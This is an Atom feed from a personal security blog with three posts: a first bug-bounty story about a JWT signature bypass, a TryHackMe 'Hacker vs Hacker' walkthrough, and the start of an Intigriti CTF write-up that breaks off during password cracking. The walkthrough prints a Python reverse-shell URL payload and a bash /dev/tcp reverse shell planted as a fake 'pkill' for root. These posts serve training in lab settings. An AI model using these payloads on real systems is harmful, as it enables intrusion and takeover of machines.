<?xml version="1.0" encoding="utf-8"?>

<feed xmlns="http://www.w3.org/2005/Atom" >
  <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
  <link href="https://darrynbrownfield.co.uk/author/darryn/feed.xml" rel="self" type="application/atom+xml" />
  <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
  <updated>2022-10-01T12:05:23+00:00</updated>
  <id>https://darrynbrownfield.co.uk/author/darryn/feed.xml</id>

  
  
  

  
    <title type="html">Darryn Brownfield | </title>
  

  
    <subtitle>Infosec | Hacking | CTF</subtitle>
  

  

  
    
      
    
  

  
  

  
    <entry>
      <title type="html">My first accepted bug bounty</title>
      <link href="https://darrynbrownfield.co.uk/firstbugbounty" rel="alternate" type="text/html" title="My first accepted bug bounty" />
      <published>2022-10-01T00:00:00+00:00</published>
      <updated>2022-10-01T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/firstbugbounty</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/firstbugbounty">&lt;p&gt;&lt;img src=&quot;/assets/images/firstbugbounty/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
&lt;p&gt;In this short blog post, I am going to explain how I found my first accepted bug, what the vulnerability was and my advice to people starting their journey in to the world of bug hunting.&lt;/p&gt;

&lt;h3 id=&quot;background&quot;&gt;Background&lt;/h3&gt;
&lt;p&gt;To be clear I am not an experienced bug hunter. For the past few years I have been studying and learning as much as I can about ethical hacking to obtain a role as a full time penetration tester which I’m pleased to say I have achieved starting October 2022. I completed my OSCP in 2020, CRTP in 2021 and will hopefully take the Burp Suite exam and TCM’s PNPT exam this year (2022).&lt;/p&gt;

&lt;p&gt;My experience in bug bounty is very limited, I successfully became a member of the Synack Red Team in May 2022 and have slowly been spending more and more time on the platform to find vulnerabilities. I have to say &lt;a href=&quot;https://www.synack.com&quot;&gt;Synack&lt;/a&gt; have been amazing, its a great platform to work on with a fantastic community of people.&lt;/p&gt;

&lt;h3 id=&quot;the-bug&quot;&gt;The bug!&lt;/h3&gt;
&lt;p&gt;The bug I found was a actually very simple, a JWT authentication bypass via unverified signature. The first thing I do when looking at a target is just navigate around the application and click all the buttons, links etc with my traffic being proxies through Burp. Then once I have an understanding about the target and the functionally I review my Burp history and see if I can spot any interesting requests or parameters.&lt;/p&gt;

&lt;p&gt;For this bug I noticed after I logged in a JWT token is sent via a POST request to the target. I decoded the JWT and replaced my username with another username. I then re-encoded the token and forwarded the request. To my surprise I was now logged in as the replacement username essentially allowing me to login in as anyone with a registered username on the platform.&lt;/p&gt;

&lt;p&gt;At this point the adrenaline kicked in, I was so excited, my first legitimate vulnerability! It was about 11:30pm, I had work at 9am the next day but I wanted to be sure of my finding. I must have tested the bypass about 10 times with 4 different user accounts to be sure. I reported my findings around 1am and went to bed.&lt;/p&gt;

&lt;p&gt;After what felt like a lifetime, I finally I got confirmation from Synack my vulnerability was accepted!&lt;/p&gt;

&lt;p&gt;A great resource for learning about JWT attacks is on &lt;a href=&quot;https://portswigger.net/web-security/jwt&quot;&gt;Port Swigger Academy&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;recommendations&quot;&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;I am just starting out on this bug bounty journey but I wanted to share the recommendations and resources I have found useful. Before hunting for your first bugs, study! Learn the common vulnerabilities, understand the &lt;a href=&quot;https://owasp.org/www-project-top-ten/&quot;&gt;OWASP top 10&lt;/a&gt;. Complete CTF challenges to get the hands on experience of using tools like Burp and practice finding and exploiting vulnerabilities.&lt;/p&gt;

&lt;p&gt;There is no quick fix or miracle methodology. You simple need to put in the hard work, the time in front of the computer and practice and preserver. I have seen lots of people ask, “how do I find my first bug” or say “I cant find any bugs”. I have been there, for months I couldn’t find anything but don’t give up, keep trying and eventually you will find one…. YOU GOT THIS!!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;YOU GOT THIS!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;My list of recommended learning material is:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://portswigger.net/web-security&quot;&gt;Port Swigger Academy&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.udemy.com/course/intro-to-bug-bounty-by-nahamsec/&quot;&gt;Nahamsec Bug Bounty Course&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/jhaddix/tbhm&quot;&gt;Jason Haddix The Bug Hunter’s Methodology (TBHM)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/channel/UCAndnmvdiphDqLLDrGnBuhA/about&quot;&gt;PhD Security&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/c/JohnHammond010&quot;&gt;John Hammond&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.amazon.co.uk/Bug-Bounty-Bootcamp-Reporting-Vulnerabilities/dp/1718501544&quot;&gt;Bug Bounty Bootcamp&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://tryhackme.com&quot;&gt;Tryhackme&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.hackthebox.com&quot;&gt;Hackthebox&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://academy.tcm-sec.com&quot;&gt;TCM Security Academy&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;next-steps&quot;&gt;Next steps…&lt;/h3&gt;
&lt;p&gt;Find more bugs….. :) I have now been bitten by the bug (pun intended) and want to find more. There is still a lot more to learn and bugs to find and looking forward to see what the journey holds.&lt;/p&gt;

&lt;p&gt;I hope to release more blog posts soon with further bug report write ups and tips and tricks I learn along the way.&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;==========================================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="bugbounty" />
      
        <category term="synack" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Hacker vs Hacker Write up</title>
      <link href="https://darrynbrownfield.co.uk/hackervshacker" rel="alternate" type="text/html" title="Hacker vs Hacker Write up" />
      <published>2022-08-21T00:00:00+00:00</published>
      <updated>2022-08-21T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/hackervshacker</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/hackervshacker">&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/hackervshacker&quot;&gt;Hacker Vs Hacker&lt;/a&gt; is a easy rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://tryhackme.com/p/Aquinas&quot;&gt;Aquinas&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The description for this room is:&lt;/p&gt;

&lt;p&gt;“The server of this recruitment company appears to have been hacked, and the hacker has defeated all attempts by the admins to fix the machine. They can’t shut it down (they’d lose SEO!) so maybe you can help?”&lt;/p&gt;

&lt;p&gt;So this is going to be different to typical CTF room!&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;I deployed the machine and was given the target IP 10.10.212.207. I started a NMAP scan to check the available ports.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/initial 10.10.212.207
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-08-21 10:32 BST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.212.207
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.076s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;14.67 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;2 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH - OpenSSH 8.2p1 Ubuntu&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Apache httpd 2.4.41&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I also ran a full port scan but no additional ports were open.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
&lt;p&gt;Checking out the website on port 80, its very basic but at the bottom is a feature to upload a CV.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/upload.png&quot; alt=&quot;upload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I created a file called test.txt just so I could try uploading something. However when I submit the request I get the response:&lt;/p&gt;

&lt;p&gt;“Hacked! If you dont want me to upload my shell, do better at filtering!”&lt;/p&gt;

&lt;p&gt;I looked at the source code of the page to see if provide any further information and found:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/hacked.png&quot; alt=&quot;hacked&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried to upload a .pdf file but got the same response so it doesn’t look like I can upload my own script to create a shell. Looking at the source code, two things jump out. The first is files are uploaded to ‘/cvs/’. Second the script is checking ‘.pdf’ is included in the filename using the function ‘strpos’.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The strpos() function finds the position of the first occurrence of a string inside another string.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If I was the hacker, to bypass this filtering I would have uploaded a file called something like ‘rce.pdf.php’. So I fuzzed the cvs directory for any files with the extensions ‘.pdf.php’.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$wfuzz&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; file,/opt/SecLists/Discovery/Web-Content/common.txt &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt; 404,403 http://10.10.212.207/cvs/FUZZ.pdf.php
&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;

Target: http://10.10.212.207/cvs/FUZZ.pdf.php
Total requests: 4661

&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
ID           Response   Lines    Word       Chars       Payload                                                                                                           
&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;

000003693:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;shell&quot;&lt;/span&gt;                                                                                                           

Total &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 0
Processed Requests: 4661
Filtered Requests: 4660
Requests/sec.: 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I got a hit! So now to find the parameter used to execute commands, typically its something like ‘cmd’ which it was but if it wasn’t it could be fuzzed.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$wfuzz&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; file,/opt/SecLists/Discovery/Web-Content/common.txt &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt; 404,403 http://10.10.212.207/cvs/shell.pdf.php?FUZZ&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;id                                                  
                                                     
&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;                                                                                                                           
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                                                                                                                           
&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;                                                                                                                           
                                                                                                                                                                                   
Target: http://10.10.212.207/cvs/shell.pdf.php?FUZZ&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;id                                                                                                                             
Total requests: 4661                                                                                                                                                               
                                                                                                                                                                                   
&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;                                                                                                              
ID           Response   Lines    Word       Chars       Payload                                                                                                                    
&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;                                                                                                              
                                                                                                                                                                                   
000000001:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.bash_history&quot;&lt;/span&gt;                                                                                                            
000000003:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.cache&quot;&lt;/span&gt;                                                                                                                   
000000012:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.htpasswd&quot;&lt;/span&gt;                                                                                                                
000000014:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.listings&quot;&lt;/span&gt;                                                                                                        
000000010:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.hta&quot;&lt;/span&gt;                                                                                                             
000000015:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.mysql_history&quot;&lt;/span&gt;                                                                                                   
000000016:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.passwd&quot;&lt;/span&gt;                                                                                                          
000000011:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.htaccess&quot;&lt;/span&gt;                                                                                                        &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Everything is returning a 200 response so instead of filtering based on the HTTP response code I changed the filter to be based on the characters in the response.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$wfuzz&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; file,/opt/SecLists/Discovery/Web-Content/common.txt &lt;span class=&quot;nt&quot;&gt;--hh&lt;/span&gt; 18 http://10.10.212.207/cvs/shell.pdf.php?FUZZ&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;id

&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;

Target: http://10.10.212.207/cvs/shell.pdf.php?FUZZ&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;id
Total requests: 4661

&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
ID           Response   Lines    Word       Chars       Payload                                                                                                           
&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;

000001100:   200        2 L      5 W        72 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;cmd&quot;&lt;/span&gt;                                                                                                             
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 0
Processed Requests: 1779
Filtered Requests: 1778
Requests/sec.: 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
&lt;p&gt;Now I have command execution, I first tried to get a shell. I started a netcat listener with the command &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nvlp 4444&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Then from the browser, I entered:&lt;/p&gt;

&lt;p&gt;http://10.10.212.207/cvs/shell.pdf.php?cmd=python3%20-c%20%27import%20os,pty,socket;s=socket.socket();s.connect((%22%22,4444));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn(%22/bin/bash%22)%27&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;A great resource for quickly creating reverse shell commands is https://www.revshells.com&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I got a hit back but shortly afterwards the shell died with the message ‘nope’.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$nc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 4444
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4444 ...
connect to &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.212.207] 41984
www-data@b2r:/var/www/html/cvs&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nope&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The hacker was killing my connection (rude!). So instead of getting a shell I used the ‘shell.pdf.php’ script to enumerate the machine. To make this easier and used Burp and send the request to the Repeater tab.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/home.png&quot; alt=&quot;home&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is a single home directory for lachlan. The ‘.bash_history’ is not empty so I checked that first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/history.png&quot; alt=&quot;history&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It looks like the password was changed, I tried to login as the lachlan user with the password.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ssh&lt;/span&gt; lachlan@10.10.212.207
lachlan@10.10.212.207&lt;span class=&quot;s1&quot;&gt;'s password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 21 Aug 2022 10:20:11 AM UTC

  System load:  0.58              Processes:             135
  Usage of /:   25.1% of 9.78GB   Users logged in:       0
  Memory usage: 26%               IPv4 address for eth0: 10.10.212.207
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun Aug 21 10:19:58 2022 from 
$ nope
Connection to 10.10.212.207 closed.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The same happened as the python shell, I got kicked out.&lt;/p&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
&lt;p&gt;I looked at the persistence cron.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/persistence.png&quot; alt=&quot;persistence&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The hacker is first setting the path to ‘/home/lachlan/bin:/bin:/usr/bin’ which means it will check the ‘/home/lachlan/bin’ folder for binaries first. Then the cron is running commands to kill any connections. Most of the commands are using absolute paths however, ‘pkill’ is not. So if I can add a file in ‘/home/lachlan/bin/’ with the name ‘pkill’ that should be executed with the permissions of root.&lt;/p&gt;

&lt;p&gt;The lachlan user owns the bin folder so if I can log in using SSH and execute the commands quickly enough I should be able to create the file before the session is killed.&lt;/p&gt;

&lt;p&gt;I copied the following command to my clipboard:&lt;/p&gt;

&lt;p&gt;echo “/bin/bash -c ‘/bin/bash -i &amp;gt;&amp;amp; /dev/tcp//4444 0&amp;gt;&amp;amp;1’” &amp;gt; /home/lachlan/bin/pkill; chmod +x /home/lachlan/bin/pkill&lt;/p&gt;

&lt;p&gt;I restarted my netcat listener, SSH’d to the machine as lachlan and pasted the command. A second later I got a shell!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$nc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 4444
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4444 ...
connect to &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.212.207] 41998
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4040&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
root@b2r:~# &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Thats root!&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;==========================================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="easy" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Intigriti 1337UP CTF 2022</title>
      <link href="https://darrynbrownfield.co.uk/intigritictf" rel="alternate" type="text/html" title="Intigriti 1337UP CTF 2022" />
      <published>2022-03-12T00:00:00+00:00</published>
      <updated>2022-03-12T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/intigritictf</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/intigritictf">&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/cover.gif&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;These are a few write ups from the 1337UP CTF hosted by [Intigriti]](https://www.intigriti.com). It was a 24 hour CTF so didn’t get as much time on it as I would have liked however it was still a lot of fun.&lt;/p&gt;

&lt;h1 id=&quot;mirage---misc&quot;&gt;Mirage - Misc&lt;/h1&gt;

&lt;p&gt;The link for the ‘Mirage’ challenge was https://mirage.ctf.intigriti.io/. There were no additional files with this challenge. Looking at the website was just a static page with no working links.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/mirage.png&quot; alt=&quot;mirage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I looked at /robots.txt and found a whole list of entries.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/miragerobots.png&quot; alt=&quot;miragerobots&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There are a few entires that lead no where and a some are trolls, the important ones are:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;Disallow: /wordlists.txt
Disallow: /ok.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wget https://mirage.ctf.intigriti.io/wordlists.txt&lt;/code&gt; to download the wordlist to my machine. On /ok.txt is some text which includes ‘/uncclzrny.wct’ with a hint of using ROT.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/mirageok.png&quot; alt=&quot;mirageok&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I went over to &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt; and used rot13 on the text. This provided the url ‘/happymeal.jpg’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/cyberchefrot.png&quot; alt=&quot;cyberchefrot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This led to another page ‘HelpMeOut.txt’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/miragehelp.png&quot; alt=&quot;miragehelp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This page provides a link to a download. Again using wget I download the zip file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/miragedownload.png&quot; alt=&quot;miragedownload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The zip is password protected.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $unzip flag.zip 
Archive:  flag.zip
[flag.zip] flag.txt password: 
   skipping: flag.txt                incorrect password
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used zip2john to create a hash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $zip2john flag.zip &amp;gt; zip.john                                                                          
ver 1.0 efh 5455 efh 7875 flag.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=68, decmplen=56, crc=CC303849
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then use john to crack the hash with the word list downloaded earlier.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $john --wordlist=wordlists.txt zip.john 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
